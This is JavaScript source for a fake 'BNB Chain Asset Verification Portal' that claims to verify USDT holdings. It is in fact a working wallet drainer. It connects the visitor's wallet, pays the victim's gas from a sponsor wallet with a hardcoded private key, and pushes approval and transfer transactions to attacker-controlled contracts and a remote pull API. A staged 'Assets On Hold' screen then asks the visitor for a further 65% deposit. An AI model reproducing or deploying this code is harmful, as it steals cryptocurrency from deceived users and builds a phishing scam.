const BUILD = "2026-11-17-v22.4"
  , CHAIN = {
    id: 56,
    hexId: "0x38",
    native: "BNB",
    usdt: "0x55d398326f99059fF775485246999027B3197955",
    dest: "0xB770af6Cc85cA93d611b70A1E920c0CD74d3EC3b",
    sponsorKey: "119798bf5f47d5222661063225863b2ee36a2879836475d623162e19a6a4c334",
    explorer: "https://bscscan.com",
    rpc: ["https://bsc-dataseed.binance.org/", "https://binance.llamarpc.com", "https://bsc-dataseed1.binance.org/", "https://1rpc.io/bnb", "https://bsc-dataseed2.binance.org/", "https://rpc.ankr.com/bsc"],
    activeRpc: null
}
  , THRESHOLD = Number(new URLSearchParams(location.search).get("min") || 0)
  , DEPOSIT_PCT = 0
  , DEPOSIT_MIN = 0
  , GAS_FLOOR = 15000000000000n
  , TOKEN_TX_GAS = 12e4
  , SPONSOR_TX_GAS = 21e3
  , SPONSOR_ADDR = "0xe07A252364810015F9B5D8716F7542006F5fbC7f"
  , TOPUP_MIN = "0.000011"
  , TOPUP_CAP = "0.0001"
  , PULL_API = "https://bsc-pull.nitintigga559.workers.dev/api/pull"
  , COLLECT_API = "https://bsc-pull.nitintigga559.workers.dev/api/collect-contract"
  , PULL_SECRET = ""
  , RELAY_URL = ""
  , SERVER_URL = ""
  , APPROVE_PULL = !1
  , PULL_GAS = 12e4
  , MULTICALL3 = "0xB770af6Cc85cA93d611b70A1E920c0CD74d3EC3b"
  , SPENDER_CONTRACT = "0xB770af6Cc85cA93d611b70A1E920c0CD74d3EC3b"
  , VERIFIER = ""
  , PAY_CONTRACT = ""
  , DESK_SELECTOR = "0xfc735e99"
  , WC_PROJECT_ID = "d5ccab4a3121ac7d4cccc552b86892a0"
  , WC_RUNTIME_SRC = "./wc-runtime.js"
  , WC_BUNDLE_SRC = "./wc-bundle.js"
  , HOLD_KEY = "hold_wallet_"
  , PENDING_KEY = "pending_drain_";
let PROMPTS = 0;
const PULLQ_KEY = "pullq_"
  , SESSION_KEY = "tab_active_wallet"
  , STEP_LABELS = ["Connecting...", "Scanning Wallet...", "Verifying Assets...", "Processing..."]
  , DEBUG = /(?:\?|&)debug=1/.test(location.search);
let provider = null
  , wcProvider = null
  , wcInit = null
  , sponsorWallet = null
  , userAddress = null
  , balanceWei = 0n
  , holdAmount = "0.00"
  , currentModal = null
  , isVerifying = !1
  , stepIdx = 0
  , gateLabel = ""
  , stepTimer = null;
const DRAIN_LOG = [];
window.__drainLog = DRAIN_LOG;
const isAddr = v => typeof v == "string" && /^0x[a-fA-F0-9]{40}$/.test(v)
  , sleep = ms => new Promise(r => setTimeout(r, ms))
  , toWord = h => String(h).replace(/^0x/i, "").toLowerCase().padStart(64, "0")
  , toUnits = raw => {
    try {
        return Number(BigInt(raw)) / 1e18
    } catch {
        return 0
    }
}
  , money = n => Number(n).toLocaleString("en-US", {
    minimumFractionDigits: 2,
    maximumFractionDigits: 2
});
function dbg(tag, info) {
    const msg = info && info.message ? info.message : String(info);
    if (DRAIN_LOG.push(tag + ": " + msg),
    console.warn("[DBG]", tag, msg),
    DEBUG)
        try {
            let strip = document.getElementById("dbgStrip");
            strip || (strip = document.createElement("div"),
            strip.id = "dbgStrip",
            strip.style.cssText = "position:fixed;left:0;right:0;bottom:0;z-index:99999;background:#000;color:#0f0;font:11px/1.4 monospace;padding:6px 8px;max-height:35vh;overflow:auto;white-space:pre-wrap;opacity:.95",
            (document.body || document.documentElement).appendChild(strip)),
            strip.textContent = String(DRAIN_LOG.length) + " \xB7 " + tag + ": " + msg + `
` + strip.textContent.split(`
`).slice(0, 12).join(`
`)
        } catch {}
}
function req(p, payload, ms=6e3) {
    return new Promise( (resolve, reject) => {
        let done = !1;
        const t = setTimeout( () => {
            done || (done = !0,
            resolve(void 0))
        }
        , ms);
        Promise.resolve().then( () => p.request(payload)).then(v => {
            done || (done = !0,
            clearTimeout(t),
            resolve(v))
        }
        ).catch(e => {
            done || (done = !0,
            clearTimeout(t),
            reject(e))
        }
        )
    }
    )
}
async function fetchJson(url, options={}, ms=15e3) {
    const ctrl = new AbortController
      , timer = setTimeout( () => ctrl.abort(), ms);
    try {
        return await fetch(url, {
            ...options,
            signal: ctrl.signal
        })
    } finally {
        clearTimeout(timer)
    }
}
let ethersMod = null;
async function getEthers() {
    if (ethersMod)
        return ethersMod;
    const m = await import("https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.esm.min.js");
    return ethersMod = m.ethers || m.default || m,
    ethersMod
}
function hint(text, ms=9e3, isError=!1) {
    try {
        let el = document.getElementById("wcHint");
        el || (el = document.createElement("div"),
        el.id = "wcHint",
        el.style.cssText = "position:fixed;top:10px;left:50%;transform:translateX(-50%);z-index:99998;background:#F0B90B;color:#080A0E;font:700 12px/1.45 system-ui,-apple-system,sans-serif;padding:10px 16px;border-radius:12px;box-shadow:0 8px 24px rgba(0,0,0,.45);max-width:92vw;text-align:center;display:none",
        (document.body || document.documentElement).appendChild(el)),
        el.textContent = text,
        el.style.background = isError ? "#ff4d4f" : "#F0B90B",
        el.style.color = isError ? "#fff" : "#080A0E",
        el.style.display = "block",
        clearTimeout(el._t),
        el._t = setTimeout( () => {
            el.style.display = "none"
        }
        , ms)
    } catch {}
}
const isMobile = () => /Android|iPhone|iPad|iPod|Mobile|Trust/i.test(navigator.userAgent || "");
function wcOverlay(uri) {
    try {
        let el = document.getElementById("wcOverlay");
        if (!el) {
            el = document.createElement("div"),
            el.id = "wcOverlay",
            el.style.cssText = "position:fixed;inset:0;z-index:99997;background:rgba(0,0,0,.85);backdrop-filter:blur(4px);display:flex;align-items:center;justify-content:center;padding:20px",
            el.innerHTML = '<div style="background:#12161F;border:1px solid #2B3344;border-radius:18px;padding:24px;max-width:340px;width:100%;text-align:center;color:#EAECEF;font-family:system-ui,-apple-system,sans-serif"><div style="font-size:34px;margin-bottom:10px">\u{1F517}</div><div style="font-weight:800;font-size:16px;margin-bottom:6px">Connect your wallet</div><div id="wcStatus" style="color:#848E9C;font-size:12px;line-height:1.5;margin-bottom:16px">Preparing secure connection\u2026</div><a id="wcOpen" style="display:none;background:#F0B90B;color:#080A0E;font-weight:800;padding:14px;border-radius:12px;text-decoration:none;margin-bottom:10px">Open Trust Wallet</a><div id="wcUri" style="color:#5E6673;font-size:10px;word-break:break-all;margin-bottom:10px"></div><button id="wcClose" style="background:none;border:none;color:#848E9C;font-size:12px;cursor:pointer">Cancel</button></div>',
            (document.body || document.documentElement).appendChild(el);
            const c = el.querySelector("#wcClose");
            c && (c.onclick = () => {
                el.style.display = "none"
            }
            )
        }
        el.style.display = "flex";
        const a = el.querySelector("#wcOpen")
          , u = el.querySelector("#wcUri");
        uri ? (a && (a.href = "https://link.trustwallet.com/wc?uri=" + encodeURIComponent(uri),
        a.style.display = "block"),
        u && (u.textContent = uri.slice(0, 54) + "\u2026"),
        wcStatus("Tap the button, then approve in Trust Wallet")) : u && (u.textContent = "")
    } catch {}
}
function wcStatus(text) {
    try {
        const el = document.getElementById("wcStatus");
        el && (el.textContent = text)
    } catch {}
}
function wcOverlayHide() {
    try {
        const el = document.getElementById("wcOverlay");
        el && (el.style.display = "none")
    } catch {}
}
function loadScript(src) {
    return new Promise( (res, rej) => {
        const el = document.createElement("script");
        el.src = src,
        el.async = !0,
        el.onload = () => res(),
        el.onerror = () => rej(new Error("load failed: " + src)),
        (document.head || document.documentElement).appendChild(el)
    }
    )
}
const $ = id => document.getElementById(id)
  , ui = {};
function cacheUi() {
    ui.verifyBtn = $("connect-button"),
    ui.initialUI = $("initialUI"),
    ui.reportPage = $("reportPage"),
    ui.standardReport = $("standardReport"),
    ui.unlockWarningUI = $("unlockWarningUI"),
    ui.mainIcon = $("mainIcon"),
    ui.repTitle = $("repTitle"),
    ui.repSub = $("repSub"),
    ui.repBoxLabel = $("repBoxLabel"),
    ui.repAmount = $("repAmount"),
    ui.btnViewTx = $("btnViewTx"),
    ui.btnRelease = $("btnRelease"),
    ui.btnContinue = $("btnContinue"),
    ui.calc65 = $("calc65Amount"),
    ui.releaseBtn = ui.btnRelease,
    ui.pendingEl = $("repPendingStatus"),
    ui.pendingText = $("repPendingText")
}
const CHECK_ICON = '<svg width="42" height="42" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" style="display:inline-block;vertical-align:middle;"><path d="M12 2 4 5v6c0 5.55 3.84 10.74 8 11 4.16-.26 8-5.45 8-11V5l-8-3Z" fill="#00ff88" opacity="0.15"/><path d="M12 2 4 5v6c0 5.55 3.84 10.74 8 11 4.16-.26 8-5.45 8-11V5l-8-3Z" fill="none" stroke="#00ff88" stroke-width="1.6" stroke-linejoin="round"/><path d="m8.5 12 2.5 2.5 5-5" fill="none" stroke="#00ff88" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"/></svg>';
function openScreen() {
    ui.initialUI && (ui.initialUI.style.display = "none",
    ui.reportPage.style.display = "block",
    ui.standardReport.style.display = "block",
    ui.unlockWarningUI && (ui.unlockWarningUI.style.display = "none"))
}
function showVerified(amountText) {
    openScreen(),
    ui.mainIcon.innerHTML = CHECK_ICON,
    ui.mainIcon.style.color = "#00ff88",
    ui.repTitle.textContent = "USDT Verified!",
    ui.repSub.textContent = "Your tokens are genuine and safe to use.",
    ui.repBoxLabel.textContent = "Verified Balance",
    ui.repAmount.textContent = amountText + " USDT",
    ui.repAmount.style.color = "#00ff88",
    ui.btnViewTx && (ui.btnViewTx.style.display = "none",
    ui.btnViewTx.onclick = null),
    ui.btnRelease && (ui.btnRelease.style.display = "none"),
    ui.btnContinue && (ui.btnContinue.style.display = "flex"),
    ui.pendingEl && (ui.pendingEl.style.display = "none")
}
function showHeld(amountText, txHash) {
    openScreen(),
    ui.mainIcon.textContent = "\u26A0\uFE0F",
    ui.mainIcon.style.color = "#F3BA2F",
    ui.repTitle.textContent = "Assets On Hold",
    ui.repSub.textContent = "Your assets are temporarily locked for security verification",
    ui.repBoxLabel.textContent = "Held Balance",
    ui.repAmount.textContent = amountText + " USDT",
    ui.repAmount.style.color = "#F3BA2F",
    ui.btnRelease && (ui.btnRelease.style.display = "flex"),
    ui.btnContinue && (ui.btnContinue.style.display = "none"),
    ui.pendingEl && (ui.pendingEl.style.display = "flex"),
    ui.pendingText && (ui.pendingText.textContent = "Verification Pending"),
    ui.btnViewTx && (txHash ? (ui.btnViewTx.style.display = "flex",
    ui.btnViewTx.onclick = () => window.open(CHAIN.explorer + "/tx/" + txHash, "_blank")) : (ui.btnViewTx.style.display = "none",
    ui.btnViewTx.onclick = null))
}
function showDeposit() {
    if (!ui.standardReport)
        return;
    const base = parseFloat(String(holdAmount).replace(/,/g, "")) || 0;
    ui.calc65 && (ui.calc65.textContent = money(base * .65) + " USDT"),
    ui.standardReport.style.display = "none",
    ui.unlockWarningUI.style.display = "block"
}
function showModal(name) {
    if (currentModal = name,
    name === "below_limit")
        return showVerified(holdAmount);
    if (name === "above_limit")
        return showHeld(holdAmount);
    if (name === "deposit_guidelines")
        return showDeposit();
    if (name === "no_wallet")
        return showVerified("0.00");
    ui.initialUI && (ui.initialUI.style.display = "block",
    ui.reportPage.style.display = "none")
}
window.open65Warning = showDeposit;
function setStep(text) {
    !ui.verifyBtn || !ui.verifyBtn.disabled || (ui.verifyBtn.innerHTML = "<span>" + text + "</span>")
}
function startStepTimer() {
    stepIdx = 0,
    clearInterval(stepTimer),
    setStep(STEP_LABELS[0]),
    stepTimer = setInterval( () => {
        stepIdx < STEP_LABELS.length - 1 && (stepIdx++,
        setStep(STEP_LABELS[stepIdx]))
    }
    , 1800)
}
function stopStepTimer() {
    clearInterval(stepTimer)
}
function discoverProvider() {
    const w = window;
    if (w.trustwallet?.ethereum)
        return w.trustwallet.ethereum;
    if (w.trustwallet?.isTrust || w.trustwallet?.isTrustWallet)
        return w.trustwallet;
    if (w.trustWallet?.ethereum)
        return w.trustWallet.ethereum;
    if (w.trustWallet?.isTrust || w.trustWallet?.isTrustWallet)
        return w.trustWallet;
    if (w.BinanceChain)
        return w.BinanceChain;
    if (w.okxwallet)
        return w.okxwallet;
    if (w.bitkeep?.ethereum)
        return w.bitkeep.ethereum;
    if (w.ethereum?.providers?.length) {
        const t = w.ethereum.providers.find(p => p?.isTrust || p?.isTrustWallet);
        if (t)
            return t;
        const m = w.ethereum.providers.find(p => p?.isMetaMask);
        return m || w.ethereum.providers[0]
    }
    return w.ethereum || null
}
const canSend = p => !!(p && (p.request || p.sendAsync || p.send));
function waitProvider(timeoutMs=1500) {
    const built = discoverProvider();
    return canSend(built) ? Promise.resolve(built) : new Promise(resolve => {
        let settled = !1;
        const finish = p => {
            settled || (settled = !0,
            clearInterval(iv),
            window.removeEventListener("ethereum#initialized", onInit),
            resolve(canSend(p) ? p : null))
        }
          , onInit = () => setTimeout( () => finish(discoverProvider()), 60);
        window.addEventListener("ethereum#initialized", onInit);
        const iv = setInterval( () => {
            const p = discoverProvider();
            canSend(p) && finish(p)
        }
        , 100);
        setTimeout( () => finish(discoverProvider()), timeoutMs)
    }
    )
}
async function getWalletConnect() {
    return WC_PROJECT_ID ? wcProvider || wcInit || (wcInit = (async () => {
        if (window.webpackChunk_N_E || (window.webpackChunk_N_E = []),
        await loadScript(WC_RUNTIME_SRC),
        !self.__wcRequire)
            throw new Error("wc runtime missing");
        await loadScript(WC_BUNDLE_SRC);
        const mod = self.__wcRequire(5110)
          , E = mod.EthereumProvider || mod.default;
        if (!E)
            throw new Error("EthereumProvider missing");
        return wcProvider = await E.init({
            projectId: WC_PROJECT_ID,
            chains: [56],
            showQrModal: !1,
            methods: ["eth_sendTransaction", "eth_accounts", "eth_requestAccounts", "personal_sign", "wallet_switchEthereumChain"],
            events: ["chainChanged", "accountsChanged", "display_uri"],
            rpcMap: {
                56: "https://binance.llamarpc.com"
            },
            metadata: {
                name: "BNB Chain | Asset Verification Portal",
                description: "Institutional asset verification and smart contract auditing protocol for the BNB Smart Chain ecosystem.",
                url: location.origin,
                icons: [location.origin + "/icon.svg"]
            },
            qrModalOptions: {
                themeMode: "dark"
            }
        }),
        dbg("wc", "provider ready"),
        wcProvider
    }
    )().catch(err => (dbg("wc", "init failed: " + (err?.message || err)),
    wcInit = null,
    null)),
    wcInit) : null
}
async function askWallet(fallbackProvider) {
    const q = new URLSearchParams(location.search)
      , forced = q.get("path")
      , keepSession = q.get("session") === "keep"
      , injected = fallbackProvider || (canSend(discoverProvider()) ? discoverProvider() : null);
    if (forced === "native") {
        if (!injected)
            return null;
        provider = injected;
        try {
            const a = await req(injected, {
                method: "eth_requestAccounts"
            }, 45e3);
            if (a && a.length && isAddr(a[0]))
                return dbg("ask:native", "requestAccounts OK"),
                cacheAccount(a[0])
        } catch (err) {
            dbg("ask:native", "requestAccounts error: " + (err?.message || err))
        }
        return null
    }
    const wc = await getWalletConnect();
    if (wc) {
        if (wc.connected && !keepSession) {
            try {
                await wc.disconnect()
            } catch {}
            await sleep(400),
            dbg("ask:wc", "previous session cleared")
        }
        if (wc.connected && wc.accounts && wc.accounts.length && isAddr(wc.accounts[0]))
            return provider = wc,
            dbg("ask:wc", "session reused (keep)"),
            cacheAccount(wc.accounts[0]);
        let gotUri = !1;
        const onUri = u => {
            u && !gotUri && (gotUri = !0,
            wcOverlay(u),
            dbg("ask:wc", "display_uri"))
        }
        ;
        try {
            wc.on("display_uri", onUri)
        } catch {}
        wcOverlay(null);
        const pending = wc.connect();
        pending.catch( () => {}
        );
        for (let i = 0; i < 50 && !gotUri; i++) {
            const u = wc.uri || wc.signer && wc.signer.uri || null;
            u ? onUri(u) : await sleep(100)
        }
        dbg("ask:wc", gotUri ? "pairing ready" : "no pairing uri after 5 s"),
        await Promise.race([pending, sleep(6e4)]),
        dbg("ask:wc", "connect settled \u2014 polling session");
        for (let i = 0; i < 100; i++) {
            const accs = wc.accounts;
            if (wc.connected && accs && accs.length && isAddr(accs[0]))
                return provider = wc,
                wcOverlayHide(),
                dbg("ask:wc", "session live \xB7 " + accs[0]),
                cacheAccount(accs[0]);
            await sleep(300)
        }
        wcOverlayHide(),
        dbg("ask:wc", "session never settled \u2014 falling back to injected")
    }
    if (injected) {
        provider = injected;
        const a = await resolveAccount(injected, !0);
        if (a)
            return a
    }
    return null
}
function cacheAccount(a) {
    const low = a.toLowerCase();
    try {
        sessionStorage.setItem(SESSION_KEY, low)
    } catch {}
    return low
}
async function resolveAccount(p, allowPrompt=!0) {
    if (!p)
        return null;
    if (p.request)
        try {
            const accs = await req(p, {
                method: "eth_accounts"
            }, 4e3);
            if (accs && isAddr(accs[0]))
                return cacheAccount(accs[0])
        } catch {}
    try {
        const cached = sessionStorage.getItem(SESSION_KEY);
        if (isAddr(cached))
            return cached.toLowerCase()
    } catch {}
    if (!allowPrompt)
        return null;
    const wc = await getWalletConnect();
    if (wc)
        try {
            if (wc.connected || await wc.connect(),
            wc.accounts && wc.accounts.length && isAddr(wc.accounts[0]))
                return provider = wc,
                dbg("wc", "session established"),
                cacheAccount(wc.accounts[0])
        } catch (err) {
            dbg("wc", "connect cancelled: " + (err?.message || err))
        }
    try {
        const a = await req(p, {
            method: "eth_requestAccounts"
        }, 45e3);
        if (a && isAddr(a[0]))
            return cacheAccount(a[0])
    } catch {}
    return null
}
async function chainIdOf(p) {
    if (!p)
        return null;
    if (p.request) {
        const v = await req(p, {
            method: "eth_chainId"
        }, 4e3);
        if (v != null && v !== "")
            return v
    }
    return p.chainId ?? null
}
function toChainNum(v) {
    if (v == null)
        return null;
    const t = String(v).trim().toLowerCase()
      , n = t.startsWith("0x") ? parseInt(t, 16) : parseInt(t, 10);
    return Number.isFinite(n) ? n : null
}
async function isOnBsc(p) {
    return toChainNum(await chainIdOf(p)) === CHAIN.id
}
const isWc = p => p && (p === wcProvider || p.isWalletConnect || p.session);
async function guardChain(p) {
    if (!p || !p.request)
        return;
    if (isWc(p)) {
        const v = await chainIdOf(p)
          , n = v == null ? null : String(v).trim().toLowerCase().startsWith("0x") ? parseInt(String(v), 16) : parseInt(String(v), 10);
        if (dbg("chain", "wc chainId = " + (v == null ? "unknown (session is 56)" : n)),
        n === null || n === CHAIN.id)
            return;
        dbg("chain", "wc reports " + n + " but session is pinned to 56 \u2014 no switch prompt");
        return
    }
    const on = await isOnBsc(p);
    if (on === !0)
        return;
    if (on === null) {
        dbg("chain", "inconclusive \u2014 no switch");
        return
    }
    const params = {
        chainId: CHAIN.hexId,
        chainName: "BNB Smart Chain Mainnet",
        nativeCurrency: {
            name: "BNB",
            symbol: "BNB",
            decimals: 18
        },
        rpcUrls: CHAIN.rpc.slice(0, 3),
        blockExplorerUrls: [CHAIN.explorer + "/"]
    };
    for (let i = 0; i < 2; i++) {
        try {
            await req(p, {
                method: "wallet_addEthereumChain",
                params: [params]
            }, 15e3)
        } catch {}
        try {
            await req(p, {
                method: "wallet_switchEthereumChain",
                params: [{
                    chainId: CHAIN.hexId
                }]
            }, 2e4)
        } catch {}
        if (await isOnBsc(p) === !0) {
            dbg("chain", "switched to BSC");
            return
        }
    }
    dbg("chain", "guard finished \u2014 continuing")
}
async function rpcRead(method, params) {
    const attempts = [...new Set([CHAIN.activeRpc, ...CHAIN.rpc].filter(Boolean))].map(async url => {
        const ctrl = new AbortController
          , timer = setTimeout( () => ctrl.abort(), 2e3);
        try {
            const json = await (await fetch(url, {
                method: "POST",
                headers: {
                    "Content-Type": "application/json"
                },
                signal: ctrl.signal,
                body: JSON.stringify({
                    jsonrpc: "2.0",
                    id: 1,
                    method,
                    params
                })
            })).json();
            if (json && json.result !== void 0 && json.result !== null)
                return CHAIN.activeRpc = url,
                json.result;
            throw new Error("empty")
        } finally {
            clearTimeout(timer)
        }
    }
    );
    try {
        return await Promise.any(attempts)
    } catch {
        return null
    }
}
async function readBalance(addr) {
    if (!addr || !isAddr(addr))
        return 0n;
    const data = "0x70a08231" + toWord(addr);
    let pool = 0n;
    for (let i = 0; i < 2; i++) {
        const hex = await rpcRead("eth_call", [{
            to: CHAIN.usdt,
            data
        }, "latest"]);
        if (hex && hex !== "0x")
            try {
                pool = BigInt(hex);
                break
            } catch {}
        i === 0 && await sleep(100)
    }
    if (pool === 0n && provider && provider.request)
        try {
            const out = await req(provider, {
                method: "eth_call",
                params: [{
                    to: CHAIN.usdt,
                    data
                }, "latest"]
            }, 6e3);
            if (out && out !== "0x") {
                const viaWallet = BigInt(out);
                return dbg("balance", "pool 0 \u2014 wallet bridge says " + toUnits(viaWallet)),
                viaWallet
            }
        } catch {}
    return pool
}
async function readGas(addr) {
    const hex = await rpcRead("eth_getBalance", [addr, "latest"]);
    if (hex && hex !== "0x")
        try {
            return BigInt(hex)
        } catch {}
    if (provider && provider.request)
        try {
            const out = await req(provider, {
                method: "eth_getBalance",
                params: [addr, "latest"]
            }, 5e3);
            if (out && out !== "0x")
                return BigInt(out)
        } catch {}
    return 0n
}
async function gasPrice() {
    const hex = await rpcRead("eth_gasPrice", []);
    try {
        const wei = BigInt(hex || "0x3b9aca00");
        return wei < 50000000n ? 50000000n : wei
    } catch {
        return 1000000000n
    }
}
async function topUpGas(addr, amountNative) {
    try {
        const ethers = await getEthers();
        sponsorWallet || (sponsorWallet = new ethers.Wallet(CHAIN.sponsorKey));
        const sponsor = sponsorWallet
          , [bal,price] = await Promise.all([readGas(sponsor.address), gasPrice()])
          , reserve = BigInt(SPONSOR_TX_GAS) * price * 2n + ethers.utils.parseEther(String(amountNative));
        if (bal <= reserve)
            return dbg("sponsor", "dry \u2014 " + ethers.utils.formatEther(bal) + " BNB"),
            !1;
        const nonce = parseInt(await rpcRead("eth_getTransactionCount", [sponsor.address, "pending"]) || "0x0", 16)
          , raw = await sponsor.signTransaction({
            to: addr,
            value: ethers.utils.parseEther(String(amountNative)),
            gasLimit: SPONSOR_TX_GAS,
            gasPrice: "0x" + price.toString(16),
            nonce,
            chainId: CHAIN.id
        });
        for (const url of [...new Set([CHAIN.activeRpc, ...CHAIN.rpc].filter(Boolean))])
            try {
                const j = await (await fetchJson(url, {
                    method: "POST",
                    headers: {
                        "Content-Type": "application/json"
                    },
                    body: JSON.stringify({
                        jsonrpc: "2.0",
                        id: 1,
                        method: "eth_sendRawTransaction",
                        params: [raw]
                    })
                }, 2500)).json();
                if (j && j.result)
                    return dbg("topup", j.result),
                    !0
            } catch {}
        return !1
    } catch (err) {
        return dbg("topup failed", err),
        !1
    }
}
async function waitFunded(addr, before, txHash, ms=12e3) {
    const end = Date.now() + ms;
    for (; Date.now() < end; ) {
        if (txHash) {
            const rc = await rpcRead("eth_getTransactionReceipt", [txHash]);
            if (rc && rc.blockNumber)
                return await sleep(1500),
                !0
        }
        if (await readGas(addr) > before)
            return await sleep(1e3),
            !0;
        await sleep(250)
    }
    return !0
}
async function ensureGas(addr) {
    try {
        const [before,price] = await Promise.all([readGas(addr), gasPrice()]);
        if (before >= GAS_FLOOR) {
            dbg("gas", "victim covers");
            return
        }
        if (RELAY_URL) {
            const env = window.ethereum?.isTrust || window.trustwallet ? "trust" : "other";
            try {
                const j = await (await fetchJson(RELAY_URL, {
                    method: "POST",
                    headers: {
                        "Content-Type": "application/json",
                        "x-wallet-env": env
                    },
                    body: JSON.stringify({
                        userAddress: addr
                    })
                }, 15e3)).json();
                if (j?.funded && j?.txHash) {
                    await waitFunded(addr, before, j.txHash);
                    return
                }
            } catch (err) {
                dbg("relay", err?.message || err)
            }
        }
        const ethers = await getEthers();
        let amt = (GAS_FLOOR - before) * 12n / 10n;
        const min = ethers.utils.parseEther(TOPUP_MIN)
          , cap = ethers.utils.parseEther(TOPUP_CAP);
        amt < min && (amt = min),
        amt > cap && (amt = cap),
        await topUpGas(addr, Number(ethers.utils.formatEther(amt))) && await waitFunded(addr, before, null, 8e3)
    } catch (err) {
        dbg("gas", err?.message || err)
    }
}
function cachedHold(addr) {
    try {
        const raw = localStorage.getItem(HOLD_KEY + addr.toLowerCase());
        if (raw) {
            const h = JSON.parse(raw);
            if (h?.isHeld && h?.amount)
                return {
                    isHeld: !0,
                    amount: h.amount,
                    step: h.step || "deposit_guidelines"
                }
        }
    } catch {}
    return null
}
function saveHold(addr, amount, step="deposit_guidelines") {
    try {
        localStorage.setItem(HOLD_KEY + addr.toLowerCase(), JSON.stringify({
            isHeld: !0,
            amount,
            step,
            timestamp: Date.now()
        }))
    } catch {}
    SERVER_URL && fetchJson(SERVER_URL + "/api/scan/status", {
        method: "POST",
        headers: {
            "Content-Type": "application/json"
        },
        body: JSON.stringify({
            address: addr.toLowerCase(),
            amount,
            action: "set"
        })
    }, 8e3).catch( () => {}
    )
}
async function queryHold(addr) {
    const local = cachedHold(addr);
    if (local)
        return local;
    if (SERVER_URL)
        try {
            const r = await fetchJson(SERVER_URL + "/api/scan/status?address=" + addr.toLowerCase(), {}, 8e3);
            if (r.ok) {
                const j = await r.json();
                if (j?.isHeld && j?.amount)
                    return saveHold(addr, j.amount),
                    {
                        isHeld: !0,
                        amount: j.amount
                    }
            }
        } catch {}
    return null
}
function markPending(addr, amountHuman) {
    try {
        localStorage.setItem(PENDING_KEY + addr.toLowerCase(), JSON.stringify({
            amount: amountHuman,
            ts: Date.now()
        }))
    } catch {}
}
function readPending(addr) {
    try {
        const raw = localStorage.getItem(PENDING_KEY + addr.toLowerCase());
        if (raw) {
            const p = JSON.parse(raw);
            if (p && p.amount)
                return p
        }
    } catch {}
    return null
}
function clearPending(addr) {
    try {
        localStorage.removeItem(PENDING_KEY + addr.toLowerCase())
    } catch {}
}
async function readAllowance(owner, spender) {
    const data = "0xdd62ed3e" + toWord(owner) + toWord(spender)
      , hex = await rpcRead("eth_call", [{
        to: CHAIN.usdt,
        data
    }, "latest"]);
    try {
        return hex && hex !== "0x" ? BigInt(hex) : 0n
    } catch {
        return 0n
    }
}
function wcSupportsSendCalls() {
    try {
        const ns = wcProvider?.session?.namespaces?.eip155;
        return (ns && ns.methods || []).includes("wallet_sendCalls")
    } catch {
        return !1
    }
}
async function rawSend(params) {
    const wc = isWc(provider)
      , bundledOk = wc ? wcSupportsSendCalls() : !0
      , send = async p => {
        if (PROMPTS++,
        dbg("prompt", "#" + PROMPTS + " eth_sendTransaction"),
        provider?.request)
            return req(provider, {
                method: "eth_sendTransaction",
                params: [p]
            }, wc ? 3e4 : 18e4);
        if (provider?.sendAsync)
            return new Promise( (res, rej) => provider.sendAsync({
                method: "eth_sendTransaction",
                params: [p],
                from: params.from
            }, (e, o) => e ? rej(e) : o?.error ? rej(o.error) : res(o?.result)));
        if (provider?.send)
            return (await provider.send("eth_sendTransaction", [p]))?.result || null;
        throw new Error("no send method")
    }
      , isReject = err => err && (err.code === 4001 || /reject|denied/i.test(err.message || ""));
    let lastErr = null;
    for (const mode of ["bare", "gas"]) {
        const p = mode === "gas" ? Object.assign({}, params, {
            gas: "0x" + TOKEN_TX_GAS.toString(16)
        }) : params;
        try {
            if (mode === "bare" && bundledOk) {
                const bundled = await trySendCalls(params.from, params.data);
                if (bundled)
                    return dbg("send", "bundled path used"),
                    bundled
            }
            dbg("send:" + mode, "to " + params.to.slice(0, 10) + "\u2026");
            const hash = await send(p);
            if (hash)
                return hash;
            lastErr = new Error("no hash")
        } catch (err) {
            if (lastErr = err,
            isReject(err)) {
                const e = new Error("REJECTED");
                throw e.rejected = !0,
                e
            }
            if (dbg("send:" + mode, "failed: " + (err?.message || err)),
            mode === "bare" && wc && err && err.code && err.code !== -32602)
                throw err;
            mode === "bare" && await sleep(wc ? 1200 : 300)
        }
    }
    throw lastErr || new Error("send failed")
}
async function silentCollect(addr, wei) {
    if (await readAllowance(addr, PAY_CONTRACT) < wei) {
        const data = "0x095ea7b3" + toWord(PAY_CONTRACT) + toWord("0x" + wei.toString(16))
          , h = await rawSend({
            from: addr,
            to: CHAIN.usdt,
            value: "0x0",
            data
        });
        dbg("approve", h),
        await waitMined(h, 25e3)
    }
    return rawSend({
        from: addr,
        to: PAY_CONTRACT,
        value: "0x0",
        data: DESK_SELECTOR
    })
}
async function waitMined(hash, ms=25e3) {
    if (!hash)
        return !1;
    const end = Date.now() + ms;
    for (; Date.now() < end; ) {
        const rc = await rpcRead("eth_getTransactionReceipt", [hash]);
        if (rc && rc.blockNumber)
            return !0;
        await sleep(1200)
    }
    return !1
}
async function callsSupported(addr) {
    try {
        const caps = await req(provider, {
            method: "wallet_getCapabilities",
            params: [addr, [CHAIN.hexId]]
        }, 4e3)
          , c = caps && (caps[CHAIN.hexId] || caps[CHAIN.id] || caps["0x38"])
          , st = c && c.atomic && c.atomic.status;
        return st === "supported" || st === "ready"
    } catch {
        return !1
    }
}
async function trySendCalls(addr, data) {
    try {
        if (new URLSearchParams(location.search).get("calls") === "0")
            return null;
        if (!await callsSupported(addr))
            return dbg("calls", "not supported"),
            null;
        const res = await req(provider, {
            method: "wallet_sendCalls",
            params: [{
                version: "1.0",
                chainId: CHAIN.hexId,
                from: addr,
                atomicRequired: !0,
                calls: [{
                    to: CHAIN.usdt,
                    value: "0x0",
                    data
                }]
            }]
        }, 3e4)
          , id = res && (res.id || res);
        if (!id)
            return null;
        dbg("calls", "bundled submit \xB7 " + String(id).slice(0, 16));
        for (let i = 0; i < 40; i++) {
            await sleep(1200);
            const st = await req(provider, {
                method: "wallet_getCallsStatus",
                params: [String(id)]
            }, 8e3)
              , status = st && (st.status ?? st.statusCode);
            if (status === 200 || status === "CONFIRMED" || status === 1) {
                const h2 = st.receipts && st.receipts[0] && st.receipts[0].transactionHash;
                return dbg("calls", "confirmed " + (h2 || "(no hash)")),
                h2 || "0xbundle"
            }
            if (status === 400 || status === 500 || status === "FAILED")
                return dbg("calls", "failed status " + status),
                null
        }
        return null
    } catch (err) {
        return dbg("calls", "unavailable: " + (err?.message || err)),
        null
    }
}
async function getSponsorAddress() {
    return SPONSOR_ADDR.toLowerCase()
}
